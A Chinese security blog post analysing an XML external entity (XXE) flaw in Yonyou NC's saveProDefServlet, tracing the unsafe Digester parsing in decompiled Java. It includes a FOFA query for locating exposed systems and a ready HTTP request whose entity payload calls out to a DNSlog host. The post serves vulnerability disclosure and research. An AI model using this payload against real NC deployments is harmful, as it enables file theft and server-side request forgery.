---
title: "用友NC saveProDefServlet XML实体注入（XXE）漏洞"
source: https://mrxn.net/jswz/yonyou-nc-saveProDefServlet-xxe-ssrf.html
asset_dir: assets/用友nc-saveprodefservlet-xml实体注入（xxe）漏洞
---

# 用友NC saveProDefServlet XML实体注入（XXE）漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/11 08:27
* 734浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

parse

解析

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC系统存在XML外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞。攻击者可通过构造恶意XML内容，利用`saveProDefServlet`接口解析，实现任意文件读取或[SSRF](https://mrxn.net/tag/SSRF)攻击等攻击，进而可能导致敏感信息泄露或进一步的系统入侵。

代码安全审计

# 影响版本

NC63、NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

这个洞（旧洞 是在审计之前的一个老洞的时候发现的

深入探索

sql

SQL

解析器

[![用友NC saveProDefServlet XML实体注入（XXE）漏洞](images/img-001-9736a57b858b.webp)](https://image.mrxn.net/7cbcb7d6412d4b7e93dabc8894a57586.webp)

那就搜索`saveProDefServlet`，找到了 `nc/uap/wfm/action/SaveProDefServlet.class` 看下它的实现吧

漏洞扫描服务

深入探索

计算机安全

软件

语法分析

```
@Servlet(
    path = "/servlet/saveProDefServlet"
)
public class SaveProDefServlet extends WfBaseServlet {
    private static final String NEW_PRODEF_PK = "NewProdefPk";
    private static final long serialVersionUID = 856521354399862503L;
    private static final String ROOT_DOC_TAG = "Root";
    private static final String RESULT_DOC_TAG = "Result";
    private static final String ISNEWVERSION_DOC_TAG = "IsNewVersion";
    private static final String ISINSERTNEW_DOC_TAG = "IsInsertNew";

    @Action(
        method = "POST"
    )
    public void doPost() {
        String proDefXml = this.request.getParameter("prodefxml");
        String isNewVersion = "false";
        String newProdefPk = null;
        String isInsertNew = "false";
        this.response.setCharacterEncoding("utf-8");
        this.response.setContentType("text/html");
        PrintWriter out = null;

        try {
            out = this.response.getWriter();
        } catch (IOException e1) {
            WfmLogger.error(e1.getMessage(), e1);
            throw new LfwRuntimeException(e1.getMessage());
        }

        try {
            proDefXml = URLDecoder.decode(proDefXml, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            WfmLogger.error(e.getMessage(), e);
            throw new LfwRuntimeException(e.getMessage());
        }

        String checkRsult = this.checkProdefXml(proDefXml);
```

`prodefxml`参数的值被带入了**checkProdefXml**方法，跟进看下它的实现

计算机科学

```
private String checkProdefXml(String proDefXml) {
    String result = "";

    try {
        ProDef prodef = ProcessParser.getInstance().parse(proDefXml);
```

继续跟进`ProcessParser`的**parse**方法

```
import org.apache.commons.digester3.Digester;
......
public ProDef parse(String prodefxml) throws WfmServiceException {
    if (prodefxml != null && prodefxml.length() != 0) {
        Reader reader = null;

        ProDef var7;
        try {
            String xmlpath = "Definitions/Process";
            Digester digester = new Digester();
            reader = new StringReader(prodefxml);
            digester.setValidating(false);
            int count = 0;
            this.recursSubProcess(digester, xmlpath, count);
            ProDef proDef = (ProDef)digester.parse(reader);
```

接收`prodefxml`后使用`Apache Commons Digester` 库将其解析成一个 `ProDef` 对象。

由于代码在解析用户传入的XML内容时，未对XML解析器进行安全配置以禁用外部实体的解析，造成了 **XML外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞**。攻击者可利用此漏洞读取服务器上的任意文件、发起服务端请求伪造（[SSRF](https://mrxn.net/tag/SSRF)）或进行拒绝服务攻击。

# 漏洞复现

> 需要注意 prodefxml 参数的值需要双重URL编码
>
> 安全工具开发

```
POST /portal/pt/servlet/saveProDefServlet/doPost?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

prodefxml={{url({{url(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>)}})}}
```

[![用友NC saveProDefServlet XML实体注入（XXE）漏洞](images/img-002-135bcc35865e.webp)](https://image.mrxn.net/562a12e49fcb45db8f6fe8706d4b2a71.webp)

在DNSLOG平台收到DNS和HTTP请求

代码安全审计

# 参考

* [关于NC系统saveProDefServlet接口的sql注入漏洞的安全通告](https://security.yonyou.com/#/noticeInfo?id=532)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#XXE](https://mrxn.net/tag/XXE)
* [#SSRF](https://mrxn.net/tag/SSRF)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC saveProDefServlet XML实体注入（XXE）漏洞](https://mrxn.net/jswz/yonyou-nc-saveProDefServlet-xxe-ssrf.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-saveProDefServlet-xxe-ssrf.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-saveProDefServlet-xxe-ssrf.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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